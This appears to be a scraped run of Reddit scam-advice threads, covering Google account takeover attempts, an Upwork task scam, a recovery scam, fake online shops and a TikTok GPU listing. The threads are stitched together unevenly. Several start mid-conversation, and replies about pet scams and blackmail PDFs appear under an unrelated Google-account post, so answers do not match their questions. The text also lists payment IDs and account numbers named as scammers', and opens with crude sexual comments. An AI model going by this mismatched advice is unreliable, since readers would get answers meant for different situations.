- Because OP keeps believing the cousin's bullshit story of an AI video. Cousin masturbated on camera, happens all the time.
- And then what? Sent his cousin the cold open to his jerkoff video‚Ä¶why, exactly?
- People lie on Reddit when cornered with questions.
- As implausible as it is, I don‚Äôt really blame OP for believing the cousin‚Äôs claim that it‚Äôs AI. The alternative would be to accept that he closely reviewed a video of his cousin masturbating. I would go with denial too.

Title: Got a scam email from @google.com via gmail.com?
Body: I just had someone attempt a scam to take over my Google account. It was a pretty convincing con including different layers that made it appear legit. Fortunately, I barely avoided falling for it.

One of the components involved me receiving an email in my Gmail account that claims to be from an @google.com email address (kind of, really it says it's from @google.com/support) and it says it was sent "via gmail.com". On a follow up email, it said it was sent "via e-msot.ru" which is way more suspect. But how were they able to send the initial email as if it was from "@google.com" where Gmail itself labelled it as having been sent "via gmail.com". I know the FROM field can be forged, but I also would have thought that little piece of "via gmail.com" verification would be meaningful... as in they wouldn't tell you @google.com or @google.com/support sent you an email *via gmail.com* unless they really did.

- Glad you didn't fall for it. Google takeovers are big business, e.g., [https://krebsonsecurity.com/2024/12/how-to-lose-a-fortune-with-just-one-bad-click/](https://krebsonsecurity.com/2024/12/how-to-lose-a-fortune-with-just-one-bad-click/)

Nowadays, everyone has an email that serves as the password reset address for their life, and I recommend people protect these addresses with hardware security key (e.g., r/yubikey ) MFA, which is essentially unphishable. I use yubikeys + Google Advanced Protection Program and Proton's similar thing.
- > how were they able to send the initial email as if it was from "@google.com"

That looks like a display name that resembles an email address. If you tap the chevron near it, you should be able to see the actual email address that it was sent from.

The Gmail app hides this information by default because it's obviously very unimportant. /s
- .ru is Russia. Also the ‚Äòfrom‚Äô can be faked.
- That's very odd and very concerning. Can you tell us what the message body said? I notice that the reply to address is google.com, so if you replied it would go there. Did the email ask you to click a link?
- The description of the scam in that link is very similar to the scam that was attempted on me. I very nearly fell for it, and I thought I wasn't someone who would fall for something so easily. Luckily I barely avoided it, but I wouldn't chalk it up to my ability to detect a scam. I got lucky. I'm shaken.

Google should make it harder for scammers to get something in my inbox that looks like it was from @google.com and verified via gmail.com.
- No, there's no additional information about who it was from, nothing to tap to show more sender details, no real email address. Even in the full headers.

https://i.imgur.com/roGwff3.png

https://i.imgur.com/kS3C6qZ.png
- The general consensus on this sub is "Never answer your phone." Scammers hate that because you can't call them back as their spoofed number.
- Well, that's *very* interesting. Never seen that before.

Was this delivered to your inbox, or the spam folder? Headers can be spoofed, but I wouldn't expect a malformed address like that to pass muster.
- It went right into my inbox. There is zero indication from Gmail that this could be potentially fraudulent - \*\*while claiming gmail.com verified that it came from google.com\*\*! It's crazy.
- Yeah, this could actually be some sort of novel exploit.

Just a theory, but does that email have an `X-Forwarded-For` header with multiple email addresses in it?
- Ok, wow. That made everything make some sense.. I kind of got myself on this one. The X-Forwarded-For is ... me. I got this email forwarded from one of my other Gmail addresses. When I opened that account and checked, it *doesn't* say the original came from gmail.com. So Google is claiming it came from [gmail.com](http://gmail.com) on the hop. Which it did. Wow. I need to watch out for that. I have a few addresses set up to forward to a main one.

Really I think Google needs to fix their UI. Even though the forward came from gmail.com, they know it really didn't originate there, so it shouldn't say "From: google.com via gmail.com" when they can really know better. But I do understand better how this occurred in the UI now.

Thanks!
- You're welcome - I figured from the 'via' bit that it was probably a forward.

I still don't understand how they were able to spoof that crazy "@google.com/support" sender. That's syntactically not even valid and it's weird that Gmail accepted it at all.
- Good catch

Title: My Cheeky Date Speed Dating
Body: I went to a My Cheeky Date event through event bright. I didn't realize it was a scam, I should have read the reviews. 

Didn't realize event bright doesn't vet the organizers. 

The reviews say they get people to buy the tickets and then they cancel or 'rescedule' the event and keep your money. Or put on some lazy meet up. 

The one I went to, the organizer showed up an hour late (it was a 2 hour event). They didn't even reserve an event space in the restaurant. She moved 4 tiny tables together and had  20 of us sit around it and told us to talk to each other. It lasted 40 minutes. 

It was in a crowded bar and we couldn't hear each other because the restaurant already had a sports event going on. 

Organizer refuses to give us a refund. Offered a free ticket to the next event. But all the reviews say they constantly cancel and 'rescedule' events and they will not refund anything. 

Yes, I did report them to event bright. Hopefully I get a refund through them. If not I'll do a charge back on my credit card. 


Edit: they owner saw my review and started threatening me. He said he knows where I live and he threatened to call my place of work and trash talk me. He did the same thing to my friend who also attended the event. They basically threatened me to take down the review and offered a refund. Jack made a racist comment to my friend who was also on the call.

- That's not really a scam, just a poorly run business.
- Sigh. NOT A SCAM. Just a bad business. Reported.
- Not a scam, just a bad experience at a business.

I took a look at their website and one thing that stood out was they distinctly said that there was no set start time for the event, they waited until all participants showed up.

Don‚Äôt use them again.
- Credit card charge back, there was no actual event per what you paid for, it was just an adhoc meet up.
- On eventbright they promised 2 hours. 

I just wish they were more professional and has customer service skills. There was no need for them to call me with threats like "I have your address I know where you live" like the guy on the phone would not let me tell my side of the story.
- üíØ
- Come on. What are you going to say to your credit card company? You didn‚Äôt like the meetup? This advice is nonsense.
- Depends on the credit card company, some will do a chargeback for being unhappy with the service/product provided or for it not being as described.
- Call them and say I didn't get what I paid for and they refused to refund.

From what I can gather this website continually charges you and won‚Äôt cancel your account, they also give other shady company‚Äôs your information and they start charging you. I paid for a $5.99 subscription on Apple Pay. What are my best steps of action to now protect myself? I was under the impression that Apple Pay was a safer way to pay and doesn‚Äôt store your information. Can I remove my Apple Pay card to avoid getting charged?

- Go to Settings, click on your name/Apple account. You can manage your subscriptions (click on Subscriptions) from there; you can also manage your Apple Pay by clicking on Payment & Shipping.
- Apple Pay (which is different from the Apple Credit Card) should be a pretty safe way to pay. Apple manages all the subscriptions and another company can't just join in if you really used Apple Pay initially. u/Wide-Spray-2186 has the cancel instructions.

If you used your Apple credit card, and not Apple Pay it's just like any other credit card. You may need to report it stolen. You can dispute charges you didn't agree to.
- I had a look and I can‚Äôt see the subscription on there, it was off a site not an app if that helps

Title: Fraud through Upwork by Questel and Elevatefin.us
Body: 1) Lugard Wayne from Questel company has given me work on 3rd January 2025, which I have applied through Upwork. (Communication on telegram)

2) I have completed the work to retype and correct Mispelt from PDF to word document. Submitted and approved successfully on 4th January 2025. (Communication on telegram)

3) Lugard, Bryan terry and support team of Questel and elevatefin.us made me open account of elevatefin.us then they impose, manipulate to pay 100 dollars for currency conversion. They asked me to pay to pranabbiswas5475-1@oksbi I paid 8800 rupees on 4th January 2025. Then they credited 2100 dollars into my account of elevatefin.us 05663657860 (Communication on telegram)

4) Now, this people asked me 255 dollars for IMF code to do wire international money transfer. I kept saying NO as its seems fraud.

5) However, Bryan manipulated me on name of help and I transferred another 5000 rupees on 9th January 2025 on krishnamitapower234@oksbi Bryan given me this upi id. I pay as I attempted local transfer to wise international payment Account 87229222 , reference number ELEV/UFKT23GS-2025 which they didnt allow on 9th January 2025.

- Common scam. ***You*** went off Upwork to Telegram, thus forfeiting Upwork's protections. That's a lesson to learn.

>Someday cyber crime will caught you for sure!

Are you joking?! The scammers are in third-world countries with no law enforcement.
- Hopefully your story here will help other people.

I am sorry you lost money. Hopefully you learned from your experience. It was a new scam for you, but it's a common scam, reported here every day. Scammers have no morals or ethics. You need to educate yourself, to avoid being scammed again.

All translation / retyping online jobs are scams, unless you have education and experience. It's just made-up work to fool you into thinking you'll get paid.

**This was not a job, it was a scam to take your money.** The platform is fake, the tasks are fake, the people are all lying to you. The name of the "company" doesn't really matter, because there are hundreds of these phony jobs using different company names. But the scams all follow the same pattern:  You will be required to pay a fee to continue working or withdraw your money. Then another fee, and another. And they will never pay you.

Read through r/scams, search for job scams and task scams, to see how many people fall victim to these scams and lose money.
- Ok does this mean, we should not continue to highlight such scam??? We should keep highlighting even if one person gets aware and don‚Äôt be in their trap.
- Honestly it's really hard to feel like talking about this scam \*again\* is going to help. We see so many posts from people after they've been scammed. It's always the same story. It's very simple to avoid this scam, NEVER pay money to get money. If there are legit fees any legit business will simply deduct them from the amount they are sending.

It's also greed blinding common sense when someone says they'll pay you a $1000 a week for an hour's worth of clicks. The world doesn't work like that, it never has and it never will.

Title: Paidwings AG & Auer witte thiel
Body: Hello, I have encountered a potentially embarrassing situation, but I want to know if it is a scam or if I should be concerned. A few months ago, out of curiosity, I decided to create an account on a dating site owned by Swiss Paidwings AG. After just a few minutes of using their services, it turned out that a lot of users are fake, so I decided to wait a bit and cancel my membership. I sent the completed "contract" termination form to the specified e-mail address, which I signed. After some time, the site tried to charge me the monthly membership fee again, so I blocked the card and did not make any payments, because before that I did not even receive any receipts in my e-mail about the payment. Now, after some time, I receive a physical letter from the Munich law firm "AUER WITTE THIEL RECHTSANWALTE" that I owe the company "Paidwings AG" the amount of 50.40 eu and if I do not pay by a certain date, they will take further legal measures. What would you advise me to do? I found a lot of information in a Google search that people have been affected by them in the same way and have received threatening letters that the case will go to court, but many say that it is a scam and to simply block them. But will ignoring it really not cause problems or just paying the specified amount and hoping for the best that these scam companies will get away with it?

Body: Alright guys. I was so dumb I fell into this scam that made me lose alot of money this past week. So about a week ago I made a post about cartel scams. So someone on Reddit hit me up on private message and said ‚Äúthis guy can help your issue just contact his watsapp‚Äù of course I believed him cause I thought he was real. Turns out it wasn‚Äôt‚Ä¶ Messaged the number on watsapp about the scams saying I needed your help n all that. Then they started asking for payments for their work I was like ok they doing this to help me I understand I‚Äôll make 2-3 short payments which is fine. Then they kept messaging saying there was an error on there end I need to send more. Then I got sussed out but I still sent it. Towards the end of it all I delayed replying back to them. Then they claimed that they an FBI agent and for them to not take this into further action that I need to send more money for them to leave me alone. So I did ü§¶üèΩ‚Äç‚ôÇÔ∏è. Then they‚Äôd message back saying oh it didn‚Äôt go thru send another. I blocked the first number. Then about 10 mins later another number probably from the same guy saying what you‚Äôre doing is wrong you gotta send it or you‚Äôll regret it. I ended up putting more money into my bank and sent him another payment. I thought it was the end of it until this morning. A different number same profile picture was saying oh the money you sent from before couldn‚Äôt be taken out. We are fbi agents blah blah‚Ä¶ you must send it or else. This time they sent me a video of my name on PayPal sending the money and it says money received‚Ä¶

- Bro please. Stop talking to people who message you. You block them, they‚Äôll message you again and again with different stories, different names, different reasons why you need to pay more money. This can go on for months, because they already know you‚Äôve paid them and fallen for other scams. So they know they can get more from you.

- Hi /u/t-poke, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Alright. Even if they try to contact me again. Just block them?
- Op is a young kid.
- You‚Äôre right I didn‚Äôt‚Ä¶ I am a complete idiot. I‚Äôm really young I should be better :/
- ‚ÄùFool me thrice; get off the internet.‚Äù
- Op is a young kid.
- I unfortunately realized this now‚Ä¶ I‚Äôm an idiot
- Life a lesson. Scammers will always find vulnerable people. I saw you tried to pm one commenter. You should stop that. Don‚Äôt trust anyone on here or anywhere on internet. Just learn from your mistake(s), read, do your own research and move on. Teach your own families and friends too.
- üëçüèΩ
- Just turn off DMs. I turned off mine the day I made my account.
- Yes. Why wouldn't you? FFS.
- Yes, unless you want to lose even more money.

And go back and read, really read, the Auto Mod message at the beginning of every single post here, especially the bit about private messages.
- The OP's own comments indicate they are over 20 (edit: they claim to be 22)

While hardly an age that most of us would be considered worldly and wise, it's not like they're pre-pubescent.
- "Ignoring stuff" is not tied to age.
- If he is old enough to text escorts, he is old enough to read the information here and inoculate himself against future scams.
- The OP's own comments indicate they are over 20 (edit: they claim to be 22)

While hardly an age that most of us would be considered worldly and wise, it's not like they're pre-pubescent.
- I‚Äôm 22
- No you're not. It's a scammers job to con you out of your money and some are very good at what they do. Learn from this so it won't happen again.
- Yes. I didn‚Äôt mean to try and pm that person on purpose I just thought they knew more about it so we can talk in private but I 100% understand and apologize for that. And yes big life lesson for myself.
- Update: I contacted PayPal and sent a file saying its scams and I even sent PayPal a screenshot of the convos so hopefully they can help me out to get some money back. And to everyone here calling me out yes I should have read the MOD. I‚Äôm very young and I made a big mistake that will never happen again thanks to all of you in here helping me.
- I‚Äôm sorry. I‚Äôve been just really nervous. I pm chatted you. Can we talk there?
- Alright. Thank you for your response
- All the more reason to help and educate.
- Yes that is true. I have a feeling this specific scammer gonna keep trying to contact me for the next few weeks. Just gotta block them. Whatever threats they say. Just gonna block them
- Did you use PayPal Goods and Services or Friends and Family?

If you used F&F, PayPal's response will be "We warned you. Goodbye."
- Absolutely not.
- >I pm chatted you. Can we talk there?

More signs you didn't read the automod. Again.
- Which the OP seems to be eager to do!

In various STD/STI related subforums.

The point I'm making is that they are an adult, judged by an arbitrary age to be welcome to drink, smoke, join the military, have intercourse and more, at least in most jurisdictions I'm familiar with, your mileage may vary.

"A young kid" is, imo, more like a 12 year old who got scammed hunting for free Robux.
- Yes. Just keep blocking them. Eventually they will give up.
- It was unfortunately F and F. Thanks for letting me know
- Ok my bad
- I never check my Reddit DMs so I just did. I have A LOT of people DMing me from this sub. 

I'll continue ignoring them.
- I apologize for that. I have read it now.
- Thank you üôèüèΩ
- Next time someone wants you to use Friends and Family, ask yourself: Is this person REALLY a friend or a family member? If NO, block.
- > I never check my Reddit DM

I only see if there is something when I get redirected from old.reddit
- Your right. I‚Äôm just really dumb. I‚Äôm closing my PayPal account as well
- What for?
- What if they try to hack my PayPal or smt

Title: Is this an ATT text message scam?
Body: Received a text from ATT about equipment.
I received  this text a few days ago : Hi, it's AT&T. Your internet equipment needs to be replaced to avoid possible service issues. Go to [website placed here] to get a new Wi-Fi gateway at no cost to you.

I didn't click the link but is this a scam? I receive texts from ATT occasionally and I was having internet issues lately but was afraid to click the link. It came from a 5 digit number starting with a 9. I'm always iffy though when a text number comes with a link to click. 

Has anyone else received text messages about equipment return from a service provider?

- Call AT&T and confirm with them. Call using the phone number on their website: https://www.att.com/support/

If it came from a 5 digit number, that‚Äôs a short code. They cost thousands of dollars a month for companies to get and are basically impossible to spoof, so it‚Äôs probably legit.
- You don't need the internet to solve this for you, just call AT&T. Find a recent bill and call the number there. If you google it be sure you get the real AT&T customer service number.

So many scams could be avoided by ignoring links and phone numbers in texts or web pages and finding an accurate number for the appropriate business and ask them about it.
- I'm assuming this is home internet, no email about this as well?
- Was the link to an ATT site, [www.att.com](http://www.att.com) is the normal one.

If it was to the official ATT site then it‚Äôs real.

I think they sent something similar when 3G was shutdown a little before Feb. 2022, they said you had to get a new phone if you had only a 3G phone. They gave free phones, my mother and father got free phones to replace their old 3G only phones.
- Thank you
- 1-800-288-2020

I know, no one should believe a random stranger on the internet. But I used to work at AT&T as a software dev on the automated phone system. I called that number a billion times to test stuff, and it‚Äôs forever engraved in my brain.
- Thanks
- Yeah no email,  just text.
- https://my.att.com/t/DmaXKYI7HUIc  yeah it has it in it, but I'll still call them to make sure it's legit.
- Yeah that‚Äôs legit, but you‚Äôre welcome to call to confirm.

Title: Someone briefly took over my Google account. Is there anything I need to check?
Body: I (partially) fell for a scam earlier today. I will write up more about what happened later, as I have pieced things together, but for now I want to know that everything is safe.

  
Someone was able to gain access to one of my Google accounts. It is not my primary account. There were no saved passwords on the account, nothing in Google Drive, nothing in Google Photos, no history of use of the account. I don't ever sign in on the account. The only thing I've ever used it for is signing up for services and having the emails forwarded to my primary account.

  
They had access to my account for about 20 minutes. After that I deactivated their device's access through Google Security, then changed my password (twice). I have been looking over things for hours. I am pretty confident they don't have access to my account anymore. I checked all the recovery settings. My recovery email and recovery phone number and 2 factor are set up correctly. I tried to figure out what they did while they were on my account. It looks like maybe they turned off activity tracking(?) so that it's not as clear.

When I go to [https://myactivity.google.com/myactivity](https://myactivity.google.com/myactivity) both "Web & App Activity" and "Timeline" tracking are turned off. I don't think I did that, especially on this account which I never sign into. So unfortunately there might not be the best records of what they did while they had access.

  
I have some indication that they went to Google Drive and Google Photos and Gmail very quickly once they had access. Again there was nothing on Google Drive or Google Photos. Gmail would have had a lot of notifications from companies. It doesn't appear anything is out of order. Nothing in trash, nothing marked as read... other than a withdrawal email notification from Coinbase from November which they might have read. I have checked and double checked my Coinbase account and it is secured. I don't see any indication that they opened any other email (most of my emails on this account stay marked unread because I just have it set up to forward to my main account). The Coinbase account is secured behind 2nd factor Yubikey which was not compromised. I never received any notifications from Coinbase.

  
I checked to see if my Google account had been used to authenticate to a 3rd party site. Google reports nothing.

  
I checked to see if any extensions or apps had been added to my Chrome (which at least for company accounts I've seen can sync across devices, though this isn't a company account). There's nothing at chrome:extensions or chrome:apps (other than Google default apps).

  
Other than Coinbase I can't think of anything I would care too much about them having access to from my email. In theory I guess Steam and TurboTax are linked to this email... but I'm not super concerned about that, nor do I see any indication that they've accessed anything like that. No notifications, nothing.

  
Again, they only had 20 minutes, and I think they were mostly focused on trying to access my other accounts. They tried doing account recovery on my main account during that time and they were unsuccessful.

  
Is there anything I haven't thought of? Is there anything in particular I should check or double check or lock down now? I am thankful it wasn't my main account and that I was able to regain control of this account so quickly and that everything seems to be in order. But it is scary to think how many little crevices where maybe they could have tucked something or done something that I didn't think about. What should I do now?

Comments:
- You really want to check with Google support instead of reddit.
- Did you check sent emails/trash? They could have used your email to send out spam.
- This is a great example of why having multiple, purpose oriented accounts - is a good move.  I assume your forwarding to a main account was how you discovered your account had been accessed?  That's what happens whenever I access an account I seldom log into.  I get an alert email sent to the account that has been logged into, that then gets forwarded to my 'central collection' account.  I see no way for a fraudster to get around that one email being sent out.

It sounds like you have resecured your account - or you know how to.  I would probably create another account for my Coinbase (in fact I have a single account dedicated to exclusively Coinbase - just as I do exclusive separate accounts for Amazon, my mortgage, my medical, etc.  They now have the user ID foryour CB account and while the account may be protected by other means, I personally would not be comfortable with an attacker having my user ID for a critical account.
- Look for forwarding rules. These guys will typically pick keywords like "balance" or "account" or "password" and forward those emails to themselves.

Go buy three security keys (e.g., r/yubikey) and set them up on your Google account and activate Google Advanced Protection Program. Put one Yubikey in a fire safe or at a trusted family member's house.
- Aside: was it this scam?

- I have tried to contact Google support through the channels I can find and been unsuccessful. Their bot just told me to take a hike. Reading other experiences doesn't sound promising. Example: [https://www.reddit.com/r/GMail/comments/1db6ji4/has\_anyone\_ever\_gotten\_help\_from\_googlegmail\_for/](https://www.reddit.com/r/GMail/comments/1db6ji4/has_anyone_ever_gotten_help_from_googlegmail_for/)

If you google lens search the pups photos, they're on other fake websites. 

Edit: Also, MEET both pup and breeder. Do NOT buy animals without seeing them in person first. Do NOT send any money before then. !pet scams are very common.

- Since they started 6 days ago? I hope you missed that rather than ignored it.
- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Pet scam.

First, you will encounter a breeder who may have their own website or who may post listings on an established website. They will offer a good price for a pet with papers, however they will not be able to meet you in real life, and will only sell you the pet with the use of a shipping/courier/freight service. The scammer will demand payment via irreversible payment methods such as Cash App, Venmo, Western Union, or cryptocurrency. The websites they use are usually very easy to spot, as the domain will have been registered recently, and the images they use should be findable using [reverse image search](https://imgops.com/). Once you pay the scammers and they know they have you, they will demand more and more fees for things like airline insurance, crating fees, papers, import permits, etc.

If you are involved in a pet scam, you need to stop talking with the scammers and dispute any transactions that you are able to dispute. [Here](https://www.akc.org/expert-advice/news/spot-puppy-scam/) is an article from the AKC regarding pet scams, and [here](https://toronto.ctvnews.ca/woman-scammed-out-of-950-trying-to-adopt-puppy-for-free-1.4929787) are [two](https://www.cbc.ca/news/canada/newfoundland-labrador/nl-alleged-pet-scam-1.5623735) news articles about pet scams.

Your full name and address are floating out there in tons of data broker websites for anyone to find.  It usually requires a payment to get that much data, but I wouldn't be at all surprised if scammers paid a subscription to these services if it gave them an increased chance at spooking people into falling for their scams.
- that pdf will contain empty threats of blackmail, delete and move on!
- Sounds like the common !blackmail scam

Just delete the email or send itvto spam
- Remember what happened to the cat. It's from an unknown sender, it's a pdf. Delete and move on with your life. Your full name and address are out there. The recent National Public Data breach leaked personal info on millions of people, everyone I know was included and my address going back to the early 80s were included. 

The leak included -

Full names

Social Security Numbers

Mailing addresses

Email addresses

Phone numbers‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã
- 'I am curious as to what's in the pdf' ....YOU have just figured it all out. Indeed, they want you to be curious. If the sender is unknown, they have no good intentions, if they mean business, they will let themselves known. 

Would you open the door to someone wearing a full face cover? No, you wouldn't........ so delete that email, there is nothing in that pdf you need or want. Be safe.
- Hi /u/Faust09th, AutoModerator has been summoned to explain the Blackmail email scam.

The exact wording of the emails varies, but there are generally four main parts. They claim to have installed a RAT (remote access trojan) or any type of software/malware after visiting a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video.

Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. If they had a video of you, they would show it to you to prove that they have it. [Here](http://www.smh.com.au/technology/gadgets-on-the-go/latest-online-scam-aims-to-prick-porn-watchers-guilty-conscience-20170815-gxwvxl.html) are some news [articles](https://www.bbb.org/denver/news-events/news-releases/2017/09/alert-pornography-email-phishing-scam/) about [this](http://blog.dynamoo.com/2017/10/bogus-porn-blackmail-attempt-from.html) scam.

There is a variant with death threats in which they will usually claim that they have been paid to kill you, and will threaten to kill you/your family if you do not pay a Bitcoin ransom. They usually also claim that they will kill your family if you report the email. The emails are spam and can be ignored.

Title: Velvet-vine.store ‚ÄûOur Website old is Just 8 Month‚Äú
Body: So I am an university student in Germany moving to a new unfurnished apartment. I‚Äôve been looking at furniture online, and since I don‚Äôt have too much money lying around I need to look for cheap or second hand furniture. Which is when I got a really well produced add on Instagram for this couch that is essentially just two mattresses, so I thought it couldn‚Äôt be too expensive and I decided to check the website out, which brought me to velvet-vine.store, a business apparently based in Los Angeles. To my untrained eye it looked great, so I picked a couch I wanted to get and was nearly ready to go, but then I decided to use the live chat that they offer to ask about shipping costs, since it can‚Äôt be cheap to ship across continents. 
I became a little suspicious when the person that started chatting with me said the shipping is free, since ‚Äûtheir compressed sofa is easy to ship‚Äú. So I messaged back and asked how long the website has been up and running, and they responded with ‚ÄûOut Website old is Just 8 Month‚Äú, which raised even more red flags. 
So I wanted to get advice if you guys think it‚Äôd be okay to order from there? The website looks great, but it just seems a bit too good to be true. And unfortunately I have no clue what to watch out for. I noticed no spelling errors on the website, and they apparently offer returns. Shipping to the US takes 7-15 business days according to the website, but shipping to the United Arab Emirates or South Korea and Hong Kong only 3-5, so could this just be that it‚Äôs an Asian company and that‚Äôs why their English was messed up? Anyway, I‚Äôd appreciate any word of advice!

Don't trust ANY advertising. They want your money, after all. 

Advice: Ask in the subreddit for whatever city/region you are going to study in. They can point you in the right direction.

- Yeah alright seems like that‚Äôs a super clean cut case then. I had a feeling that would be the answer but thanks everyone for helping me not make stupid choices!
- I ordered a couch for $89 the other day and it charged Bautista Financials, this morning I got a $499 charge from velvet-vine, I‚Äôm currently emailing a name called Emily cohen. I‚Äôm asking for my tracking # and I just asked about what I said above. Says my order was shipped today I should have couch in 5-7 days. Website says their based in LA
- [removed]
- Thats funny that they basically told on themselves. Even an 8 month old website vs 7 days is still a huge red flag.
- I was looking at a couch as well on there... Say 75,$ and 86$ for express secured...
I love the couch style but have been scammed before on a website similar... They shut down their site and "company" and whatever account type they used I couldn't get a refund (used a visa debit to pay as well which caused problems)

**This domain name was created ONLY 7 DAYS AGO!!** and it was only registered for a single year (Expires: Jan 2026). 

The person/organization who registered this domain claims to be based in Iceland. It is also concerning that they are hiding the rest of their contact info on Whois. This website is hosted on a server located in Canada (*Cloudflare, Inc.*), but this is probably a "proxy" which is masking where the website's server actually is.

Title: Eldorado gg V-Bucks scam : support don't want to refund
Body: I bought V-bucks for Fortnite, received them but a few days later they are removed from my account, I got a message from the game saying the vbucks were removed because ‚Äúa payment on the account has been reversed or refunded." Which proves that the seller is a scammer and cancelled the payment himself to get the money back!

  
I contacted support, they don't want to refund me, they gave a ridiculous 3% promo code and told me I had to choose a seller with a better reputation. (The seller I had chosen had thousands of positive reviews by the way). Then I told them again that I wanted my money back and they told me it was up to me to go to the police so they could maybe get the seller's information. (It would be pointless anyway). After that I kept trying to get my money back, but they wouldn't listen, and finally when I told them I was going to expose their scam on reddit and trustpilot they banned me from their sites. (how bizarre!)

- You're doing things that violate a games ToS. Don't expect much help here. This is A LOT like buying drugs online, ya shouldn't do it


I came back to add:

You should think of every criminal in the same way, selling drugs or selling accounts same thing. Would you argue with a Mexican cartel? Threaten them with bad reviews? Nope, because they're criminals and the operate outside of the law. Same thing with these third party sellers, roast them all you want they don't care. Blocked banned on to the next one. Not sure how you don't understand this lol
- You're breaking the TOS. Anytime you do this you accept the risk. Sometimes it works sometimes it doesn't but you aren't getting a refund.  Instead of just taking your lumps from something you know could happen, now you can't buy from them ever again.
- You KNOWINGLY bought a watch from a guy in a dark alley and you just found out it‚Äôs fake. As others pointed out, you‚Äôre buying in-game currency from a ‚Äúgold seller.‚Äù This violates the terms of service and many of these sellers use stolen accounts and/or stolen credit cards.

Title: Bought a suspiciously cheep gpu from tiktok shop
Body: Last night I stumbled upon a very cheap GPU on TikTok that goes for over 2 grand for 75 dollars. The seller looked suspicious because they had other valuable ones on their listings for sale for cheap prices as well. Of course, I was suspicious but still reluctantly bought it because if it was indeed a scam, I had buyer protection and paid with PayPal. Later on, they removed all their listings, but my order was still placed, and I can still track it, but the seller texted me on my personal number with some Gmail telling me I needed to pay them to get a shipping label or something, and I'm probably just going to refund it.

And yet you did it. Greed is truly a strong motivator. 

Don't give money to tiktok, and maybe even stop using it altogether.
- Sooo you let yourself get scammed for ..our viewing pleasure ? Thx
- A $2000 GPU for $75 and being sold on TikTok... Hmmm, I see absolutely nothing wrong with this choice.
- Remember kids, if it's too good to be true, that's because it probably *is*.


Make sure you guys PayPal all the documents they need OP. Buyer protection with them can be a pain since they are known to be merchant friendly.
- >I respect the hustle

Do you think scammers deserve respect?
- This is a SCAM. You aren't getting a Rog Strix 4090 for $81, those sell for over $2,000... you greedy little piggy.

Basically, TikTok will probably give you the $81 back, but when you send the scammer $50 via Apple Pay, Zelle or Chime... those are all non-refundable payment methods designed for sending money to friends and family. That money is GONE once you hit send.
- >I had buyer protection and paid with PayPal.



>but the seller texted me on my personal number with some Gmail telling me I needed to pay them to get a shipping label or something, and I'm probably just going to refund it..

Wait... you aren't actually going to through with it and pay the additional fee are you? Someone needs to cut your Internet access for your own good.
- You need to report this to TikTok since they are not banned anymore. You can go ahead and report this to them. Block the seller and do not give them any of your information.
- ‚ÄúI can show you my ID‚Äù

Yeah that really clears things up.
- Of course this is a scam? 1.) You're buying off of Tim tok. 2.) You're even then going off platform 3.) You admit it's "suspiciously cheap" 4.) They're asking you to pay a "stamp fee" of $50 (whatever that is)


Talk about red flags
- >on TikTok 

TikTok is a social media platform for funny videos, not a marketplace for selling things.  99.99% of everything you attempt to buy via TikTok will be a scam.

>The seller looked suspicious 

Oh, good.  You realized that there was something wrong here so you avoided it.  Right?

>but still reluctantly bought it 

\*sigh\*

>because if it was indeed a scam, I had buyer protection and paid with PayPal

Please, *please* tell me you used PayPal Goods and Services instead of Friends and Family.

>the seller texted me on my personal number with some Gmail telling me I needed to pay them to get a shipping label or something

If it was a Goods and Services transaction, this is the part where they're trying to get some money from you that you can't reverse.

I mean, good on you for eventually realizing that this was a scam, but in the future don't buy things from TikTok, and don't buy things that are suspiciously cheap.  Because you're just *begging* to get scammed.
- >suspiciously cheap

>TikTok shop

I don't know about anyone else, but that's enough for me to stop a Nascar race...
- [removed]
- [removed]
- More than likely they will eventually send you something...probably junk or a photo of the gpu, with tracking so they can say you received the order. They will then argue that you are trying to scam them.
- I think the OP is a fake user account or at least a failed attempt at farming karma. This post/comment is the only thing coming up in their history.
- Can we go back to 36 hours ago when TikTok was banned?
- your right, should have left it alone.
- Fr what is op on
- >our viewing pleasure

OP is a modern stuntman
- Why do people keep typing with multiple periods or commas. I'm so confused at this trend
- never said anything about me Getting scammed myself was just making others aware of it, and to be honest, part of it is my fault for falling into greed.
- shocked that you‚Äôd suggest I‚Äôm not following through with a payment to which I have legitimate concern for. If you saw the screenshots you could see that the seller was attempting to get additional fees paid through a third-party platform or an alternative method that would essentially put my money at risk. All necessary fees had already been paid through the tiktok platform. I‚Äôm simply trying to protect myself from a potentially fraudulent situation bro.
- honestly it was just greed, and no I didn‚Äôt pay with friends and family. I have bought things on the platform in the past but this was blatantly obvious, but I still did it.

- A lot of people just jump in to participate in one discussion or post and don‚Äôt engage much elsewhere. Plus It doesn‚Äôt automatically mean the account is fake or for karma farming.Just because i have had this account for over a year and finally decided to make a post doesn‚Äôt mean i‚Äôm trying to farm i just finally had something i wanted to share. You really got butt hurt by someone on reddit and went through my account and see how you can use anything against me or see what you can find out about me. I mainly use reddit as help online but never ask questions myself. But I‚Äôd be open to hearing your thoughts if you think or can prove I am.
- I have this suspiciously cheap time machine I'd sell you.
- Johnny Knoxville and Steve-O have nothing on OP.
- You sent money to a scammer, and will never get anything in return. That is called "getting scammed."
